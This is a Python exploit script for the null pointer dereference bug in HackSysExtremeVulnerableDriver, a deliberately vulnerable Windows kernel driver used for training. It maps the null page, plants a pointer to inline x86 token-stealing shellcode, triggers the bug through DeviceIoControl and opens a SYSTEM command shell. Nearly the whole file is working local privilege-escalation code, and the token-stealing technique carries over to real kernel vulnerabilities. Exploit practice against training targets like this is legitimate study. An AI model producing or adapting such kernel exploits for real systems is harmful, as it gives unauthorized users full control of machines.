import os
from helper import *
from ctypes import *

def ioctl(function, devicetype = 0x00000022, access = 0x00000000, method = 0x00000003):
	return ((devicetype << 16) | (access << 14) | (function << 2) | method)

def main():
	HEVD_IOCTL_NULL_POINTER_DEREFERENCE = ioctl(0x80A)
	lpFileName = "\\\\.\\HackSysExtremeVulnerableDriver"
	handle = get_handle(lpFileName)

	steal_token = (
		"\x60"                              # pushad
		"\x33\xc0"                          # xor   eax,eax
		"\x64\x8b\x80\x24\x01\x00\x00"      # mov   eax,DWORD PTR fs:[eax+0x124]
		"\x8b\x40\x50"                      # mov   eax,DWORD PTR [eax+0x50]
		"\x8b\xc8"                          # mov   ecx,eax
		"\x8b\x80\xb8\x00\x00\x00"          # mov   eax,DWORD PTR [eax+0xb8]
		"\x2d\xb8\x00\x00\x00"              # sub   eax,0xb8
		"\x83\xb8\xb4\x00\x00\x00\x04"      # cmp   DWORD PTR [eax+0xb4],0x4
		"\x75\xec"                          # jne   0xe
		"\x8b\x90\xf8\x00\x00\x00"          # mov   edx,DWORD PTR [eax+0xf8]
		"\x89\x91\xf8\x00\x00\x00"          # mov   DWORD PTR [ecx+0xf8],edx
		"\x61"                              # popad
		"\xc3"                              # retn
	)

	# Alloc the 'shellcode' somewhere in the memory
	ptr = alloc_memory_virtualalloc(0, len(steal_token), steal_token)
	shellcode_ptr = p32(ptr)

	# VirtualAlloc will refuse a base address smaller than 0x1000
	addr = alloc_null_page(0x1, 0x100)

	print("[+] Writing shellcode pointer to 0x00000004")
	# kd> dd esi+4
	# 00000004  ???????? ???????? ???????? ????????
	tmp_ptr = create_string_buffer(shellcode_ptr, 0x4)
	memmove(0x4, addressof(tmp_ptr), 0x4)

	# MagicValue = 0xbad0b0b0
	payload = p32(0xbad0b0b1)
	payload_input = create_string_buffer(payload)

	# Trigger the bug via DeviceIoControl() and a wrong 'MagicValue'
	device = trigger(handle, HEVD_IOCTL_NULL_POINTER_DEREFERENCE,
					addressof(payload_input), len(payload_input))

	print("[+] Spawn SYSTEM shell\n")
	os.system("cmd.exe")

if __name__ == "__main__":
	main()
